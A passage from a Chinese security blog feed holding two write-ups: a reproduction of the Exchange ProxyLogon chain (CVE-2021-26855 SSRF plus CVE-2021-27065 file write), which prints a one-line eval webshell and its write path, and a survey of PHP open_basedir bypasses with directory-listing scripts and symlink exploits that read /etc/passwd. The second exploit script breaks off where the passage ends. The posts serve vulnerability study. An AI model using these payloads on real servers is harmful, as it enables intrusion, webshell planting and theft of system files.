    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>微软在上半年三月披露了关于Exchange邮件服务器<code>CVE-2021–26855</code>(SSRF)与<code>CVE-2021–27065</code>(任意文件写入)的漏洞,这两个漏洞配合可以造成未授权的webshell写入,是非常严重的高危漏洞。漏洞刚出来那会儿并未注意,正好前两天4哥在群里发了个关于该漏洞的复现环境,重新想起这个事,正好暑假也没干啥正事,借此机会复现分析一下。</p><h2 id="CVE-2021–26855"><a href="#CVE-2021–26855" class="headerlink" title="CVE-2021–26855"></a>CVE-2021–26855</h2><p><code>CVE-2021–26855</code>是⼀个SSRF,只需要能够访问Exchange服务器,攻击者可以不经过任何类型的身份验证来利⽤此漏洞。</p><p>相关漏洞在<code>C:\Program Files\Microsoft\ExchangeServer\V15\FrontEnd\HttpProxy\bin</code>目录下的<code>Microsoft.Exchange.FrontEndHttpProxy.dll</code><br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/1.png"></p><p>进入<code>ProxyModule</code>类的<code>OnPostAuthorizeRequest</code>函数,该函数用于对post请求的安全检查,函数中继续调用了该类的<code>OnPostAuthorizeInternal</code>函数。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/2.png"></p><p><code>OnPostAuthorizeInternal</code>函数中调用<code>SelectHandlerForUnauthenticatedRequest</code>函数,从函数名称上来看该函数作用为:寻找对未验证安全请求的处理方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/3.png"></p><p>跟进<code>SelectHandlerForUnauthenticatedRequest</code>函数,发现对不同的<code>ProtocolType</code>,生成了不同的 <code>httpHandler</code>。而这个<code>ProtocolType</code>正是url中的web子目录,比如请求<code>/ecp/n.png</code>,<code>ProtocolType</code>就是ecp。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/4.png"></p><p>当<code>ProtocolType</code>为ecp时,如果<code>BEResourceRequestHandler</code>类的<code>CanHandle</code>函数返回值为真,就会使用<code>BEResourceRequestHandler</code>作为处理方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/5.png"></p><p>跟进<code>CanHandle</code>方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/6.png"></p><p>可以看到如果要返回真,则需要同时让<code>GetBEResouceCookie</code>和<code>IsResourceRequest</code>函数同时返回值为真。跟进这两个函数。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/7.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/8.png"></p><p>先看<code>GetBEResouceCookie</code>,该函数要请求cookies中一个<code>BEResource</code>字段的值,实际上就是<code>X-BEResource</code>。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/9.png"></p><p>那么在cookies中设置一个<code>X-BEResource</code>字段的值即可。<br><code>IsResourceRequest</code>则是需要请求路径以<code>.js</code>,<code>.png</code>等结尾。</p><p>这时候回到<code>OnPostAuthorizeInternal</code>函数中,由于<code>BEResourceRequestHandler</code>是继承于<code>ProxyRequstHandler</code>类的,就会执行<code>((ProxyRequestHandler)httpHandler).Run(context)</code>,最终在<code>HttpContext.RemapHandler</code>中把该httpHandler设置给<code>this._remapHandler</code>，即是context.Handler。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/11.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/10.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/12.png"></p><p>又调用了<code>Handler.BeginProcessRequest()</code>,此时Handler为<code>BEResourceRequestHandler</code>,该类没有<code>BeginProcessRequest</code>函数,但却继承了<code>ProxyRequestHandler</code>。因此实际上调用的是<code>ProxyRequestHandler.BeginProcessRequest()</code>函数。</p><p><code>BeginProcessRequest</code>函数创建线程调用<code>ProxyRequestHandler.BeginCalculateTargetBackEnd</code>函数。该函数作用是根据Cookie中的<code>X-BEResource</code>字段来判断与生成指向BackEnd的目标url。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/13.png"></p><p>继续跟入,<code>BeginCalculateTargetBackEnd</code>调用<code>ProxyRequestHandler.InternalBeginCalculateTargetBackEnd</code>方法。</p><p><code>InternalBeginCalculateTargetBackEnd</code>调用<code>BEResourceRequestHandler.ResolveAnchorMailbox</code>方法。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/14.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/15.png"><br><code>BEResourceRequestHandler.ResolveAnchorMailbox</code>方法会获取<code>X-BEResource</code>字段。</p><p>跟入查看<code>BackEndServer.FromString</code>函数,会发现它依据<code>~</code>符号切割<code>beresourceCookie</code>字符串,前半段作为fqdn,后半段作为version。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/16.png"></p><p>fqdn为:全限定域名。在邮件中例如:<a href="mailto:&#x73;&#100;&#x40;&#x76;&#x69;&#x70;&#46;&#99;&#111;&#109;">&#x73;&#100;&#x40;&#x76;&#x69;&#x70;&#46;&#99;&#111;&#109;</a><br>而version指的是BackEndServer Version。</p><p>fqdn和verison变量将在<code>ProxyRequestHandler.BeginProxyRequest</code>函数中调用的的<code>GetTargetBackEndServerUrl</code>函数进行调用。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/17.png"></p><p>由于<code>BackEndServer.Fqdn</code>是可控的,<code>clientUrlForProxy.Host</code>则是可控的。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/18.png"></p><p>继续看<code>ProxyRequestHandler.BeginProxyRequest</code>后面,<code>ProxyRequestHandler.CreateServerRequest</code>将吧uri发送给后端服务器。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/19.png"></p><p>跟踪<code>ProxyRequestHandler.CreateServerRequest</code>,函数中<code>PrepareServerRequest</code>将进行uri代理请求的身份认证判断。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/20.png"></p><p>通过最后一个else绕过认证,达到一个SSRF漏洞攻击的过程。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/21.png"></p><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/26.png"></p><h2 id="CVE-2021–27065"><a href="#CVE-2021–27065" class="headerlink" title="CVE-2021–27065"></a>CVE-2021–27065</h2><p><code>CVE-2021–27065</code>是⼀个任意⽂件写⼊漏洞，它需要登陆的管理员账号权限才能触发。而<code>CVE-2021–26855</code>正好可以为我们提供了管理员账号权限。</p><p>登录管理员账号后,进入:服务器——&gt;虚拟目录——&gt;OAB<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/22.png"></p><p>编辑OAB配置,在外部链接中写⼊shell并保存。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://aaa/<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Page_Load</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">eval</span>(Request[<span class="hljs-string">&quot;SD&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/23.png"></p><p>保存后选择重置虚拟目录<br>写下shell位置为:<code>\\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\sd.aspx</code><br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/24.png"></p><p>查看shell文件,写入了一句话木马。<br><img src="/img/CVE-2021%E2%80%9326855%E4%B8%8ECVE-2021%E2%80%9327065/25.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.praetorian.com/blog/reproducing-proxylogon-exploit/">https://www.praetorian.com/blog/reproducing-proxylogon-exploit/</a></p><p><a href="https://jishuin.proginn.com/p/763bfbd5ac72">https://jishuin.proginn.com/p/763bfbd5ac72</a></p><p><a href="https://zhuanlan.zhihu.com/p/357183471">https://zhuanlan.zhihu.com/p/357183471</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Bypass open_basedir总结</title>
    <link href="/2021/08/14/bypass_open_basedir/"/>
    <url>/2021/08/14/bypass_open_basedir/</url>
    
    <content type="html"><![CDATA[<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。<br>在<code>php.ini</code>中设置<code>open_basedir</code>的值</p><p><img src="/img/bypass_open_basedir/1.png"></p><p><img src="/img/bypass_open_basedir/2.png"></p><p>设置<code>open_basedir=/var/www/html/</code>,通过web访问服务器的用户就无法获取服务器上除了<code>/var/www/html/</code>这个目录以外的文件。<br>假设这时连接一个webshell,当webshell工具尝试遍历和读取其他目录时将会失败。<br><img src="/img/bypass_open_basedir/3.png"></p><h2 id="通过系统命令函数"><a href="#通过系统命令函数" class="headerlink" title="通过系统命令函数"></a>通过系统命令函数</h2><p><code>open_basedir</code>对命令执行函数没有限,使用<code>system()</code>函数试一下<br><img src="/img/bypass_open_basedir/4.png"></p><p>能够遍历上上级目录,而在webshell工具中时被禁止的,说明确实能够绕过<br><img src="/img/bypass_open_basedir/5.png"></p><p>实际情况中,可能<code>system()</code>函数由于disable_function禁用无法使用,可通过同类执行命令函数绕过。</p><h2 id="利用glob-绕过"><a href="#利用glob-绕过" class="headerlink" title="利用glob://绕过"></a>利用glob://绕过</h2><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p><code>glob://</code>是查找匹配的文件路径模式,<code>glob</code>数据流包装器自 PHP 5.3.0 起开始有效。<br>下面是<a href="https://www.php.net/manual/zh/wrappers.glob.php">官方</a>的一个domo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="hljs-comment">// 并打印文件名和文件尺寸</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob://ext/spl/examples/*.php&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    printf(<span class="hljs-string">&quot;%s: %.1FK\n&quot;</span>, <span class="hljs-variable">$f</span>-&gt;getFilename(), <span class="hljs-variable">$f</span>-&gt;getSize()/<span class="hljs-number">1024</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要和其他函数配合,单独的glob是无法绕过的。<br>并且局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p><h3 id="利用-DirectoryIterator-glob"><a href="#利用-DirectoryIterator-glob" class="headerlink" title="利用 DirectoryIterator+glob://"></a>利用 DirectoryIterator+glob://</h3><p><code>DirectoryIterator</code> 类提供了一个简单的界面来查看文件系统目录的内容。<br>脚本如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_open_basedir/6.png"></p><h3 id="利用-opendir-readdir-glob"><a href="#利用-opendir-readdir-glob" class="headerlink" title="利用 opendir()+readdir()+glob://"></a>利用 opendir()+readdir()+glob://</h3><p><code>opendir</code>作用为打开目录句柄<br><code>readdir</code>作用为从目录句柄中读取目录</p><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    closedir(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只能列目录，php7可以用如下方法读非根目录文件,<code>glob:///*/www/../*</code> 可列举 <code>/var</code></p><p><img src="/img/bypass_open_basedir/7.png"></p><h3 id="利用-scandir-glob"><a href="#利用-scandir-glob" class="headerlink" title="利用 scandir()+glob://"></a>利用 scandir()+glob://</h3><p><code>scandir()</code>函数可以列出指定路径中的文件和目录<br><img src="/img/bypass_open_basedir/8.png"></p><p>这种方法也只能列出根目录和open_basedir允许目录下的文件。</p><h2 id="利用symlink绕过"><a href="#利用symlink绕过" class="headerlink" title="利用symlink绕过"></a>利用symlink绕过</h2><p><code>symlink()</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">symlink(<span class="hljs-keyword">string</span> <span class="hljs-variable">$target</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$link</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>symlink()对于已有的 target 建立一个名为 link 的符号连接。<br>而target一般情况下受限于open_basedir。<br>官方的domo:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;uploads.php&#x27;</span>;<br><span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;uploads&#x27;</span>;<br>symlink(<span class="hljs-variable">$target</span>, <span class="hljs-variable">$link</span>);<br><br><span class="hljs-keyword">echo</span> readlink(<span class="hljs-variable">$link</span>);<br><span class="hljs-comment"># 将会输出&#x27;uploads.php&#x27;这个字符串</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果将要读取<code>/etc/passwd</code>poc如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mkdir(<span class="hljs-string">&quot;A&quot;</span>);<br>chdir(<span class="hljs-string">&quot;A&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;B&quot;</span>);<br>chdir(<span class="hljs-string">&quot;B&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;C&quot;</span>);<br>chdir(<span class="hljs-string">&quot;C&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;D&quot;</span>);<br>chdir(<span class="hljs-string">&quot;D&quot;</span>);<br>chdir(<span class="hljs-string">&quot;..&quot;</span>);<br>chdir(<span class="hljs-string">&quot;..&quot;</span>);<br>chdir(<span class="hljs-string">&quot;..&quot;</span>);<br>chdir(<span class="hljs-string">&quot;..&quot;</span>);<br>symlink(<span class="hljs-string">&quot;A/B/C/D&quot;</span>,<span class="hljs-string">&quot;SD&quot;</span>);<br>symlink(<span class="hljs-string">&quot;SD/../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;POC&quot;</span>);<br>unlink(<span class="hljs-string">&quot;SD&quot;</span>);<br>mkdir(<span class="hljs-string">&quot;SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问web后,将会生成名为POC的文件<br><img src="/img/bypass_open_basedir/9.png"></p><p><img src="/img/bypass_open_basedir/10.png"></p><p>分析一下poc过程:</p><ol><li>创建A/B/C/D目录，并返回到起始目录</li><li><code>symlink(&quot;A/B/C/D&quot;,&quot;SD&quot;)</code>:创建符号文件SD,指向A/B/C/D</li><li><code>symlink(&quot;SD/../../../../etc/passwd&quot;,&quot;POC&quot;)</code>:创建符号文件POC,指向<code>SD/../../../../etc/passwd</code>。此时SD=A/B/C/D,而<code>A/B/C/D../../../../</code>=<code>/var/www/html</code>,符合open_basedir的限制,创建成功。</li><li>unlink(“SD”):删除软链接SD，并创建一个文件夹,此时SD作为一个真正的目录存在。那么访问POC,指向的是<code>SD/../../../../etc/passwd</code>,<code>SD/../../../</code>就是/var目录,<code>/var/../etc/passwd</code>恰好可以读取到etc目录下的passwd，从而达到跨目录访问的效果。</li></ol><p>这里需要跨几层目录就需要创建几层目录。</p><p>最后附上p牛EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */</span><br>header(<span class="hljs-string">&#x27;content-type: text/plain&#x27;</span>);<br>error_reporting(-<span class="hljs-number">1</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-literal">TRUE</span>);<br>printf(<span class="hljs-string">&quot;open_basedir: %s\nphp_version: %s\n&quot;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>), phpversion());<br>printf(<span class="hljs-string">&quot;disable_functions: %s\n&quot;</span>, ini_get(<span class="hljs-string">&#x27;disable_functions&#x27;</span>));<br><span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-variable">$relat_file</span> = getRelativePath(<span class="hljs-keyword">__FILE__</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$paths</span> = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$name</span> = mt_rand() % <span class="hljs-number">999</span>;<br><span class="hljs-variable">$exp</span> = getRandStr();<br>mkdir(<span class="hljs-variable">$name</span>);<br>chdir(<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span> ; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$paths</span>) - <span class="hljs-number">1</span> ; <span class="hljs-variable">$i</span>++)&#123;<br>    mkdir(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br>    chdir(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br>mkdir(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> -= <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt; <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123; <br>    chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$paths</span> = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$relat_file</span>);<br><span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-string">&#x27;..&#x27;</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    mkdir(<span class="hljs-variable">$name</span>);<br>    chdir(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$j</span>++;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$j</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$tmp</span> = array_fill(<span class="hljs-number">0</span>, <span class="hljs-variable">$j</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$name</span>);<br>symlink(implode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$tmp</span>), <span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><span class="hljs-variable">$tmp</span> = array_fill(<span class="hljs-number">0</span>, <span class="hljs-variable">$j</span>, <span class="hljs-string">&#x27;..&#x27;</span>);<br>symlink(<span class="hljs-string">&#x27;tmplink/&#x27;</span> . implode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$tmp</span>) . <span class="hljs-variable">$file</span>, <span class="hljs-variable">$exp</span>);<br>unlink(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br>mkdir(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br>delfile(<span class="hljs-variable">$name</span>);<br><span class="hljs-variable">$exp</span> = dirname(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>]) . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$exp&#125;</span>&quot;</span>;<br><span class="hljs-variable">$exp</span> = <span class="hljs-string">&quot;http://<span class="hljs-subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span><span class="hljs-subst">&#123;$exp&#125;</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n-----------------content---------------\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$exp</span>);<br>delfile(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRelativePath</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>, <span class="hljs-variable">$to</span></span>) </span>&#123;<br>  <span class="hljs-comment">// some compatibility fixes for Windows paths</span><br>  <span class="hljs-variable">$from</span> = rtrim(<span class="hljs-variable">$from</span>, <span class="hljs-string">&#x27;\/&#x27;</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>  <span class="hljs-variable">$from</span> = str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$from</span>);<br>  <span class="hljs-variable">$to</span>   = str_replace(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$to</span>);<br><br>  <span class="hljs-variable">$from</span>   = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$from</span>);<br>  <span class="hljs-variable">$to</span>     = explode(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$to</span>);<br>  <span class="hljs-variable">$relPath</span>  = <span class="hljs-variable">$to</span>;<br><br>  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$from</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$depth</span> =&gt; <span class="hljs-variable">$dir</span>) &#123;<br>    <span class="hljs-comment">// find first non-matching dir</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-variable">$to</span>[<span class="hljs-variable">$depth</span>]) &#123;<br>      <span class="hljs-comment">// ignore this directory</span><br>      array_shift(<span class="hljs-variable">$relPath</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// get number of remaining dirs to $from</span><br>      <span class="hljs-variable">$remaining</span> = count(<span class="hljs-variable">$from</span>) - <span class="hljs-variable">$depth</span>;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$remaining</span> &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// add traversals up to first matching dir</span><br>        <span class="hljs-variable">$padLength</span> = (count(<span class="hljs-variable">$relPath</span>) + <span class="hljs-variable">$remaining</span> - <span class="hljs-number">1</span>) * -<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$relPath</span> = array_pad(<span class="hljs-variable">$relPath</span>, <span class="hljs-variable">$padLength</span>, <span class="hljs-string">&#x27;..&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$relPath</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;./&#x27;</span> . <span class="hljs-variable">$relPath</span>[<span class="hljs-number">0</span>];<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> 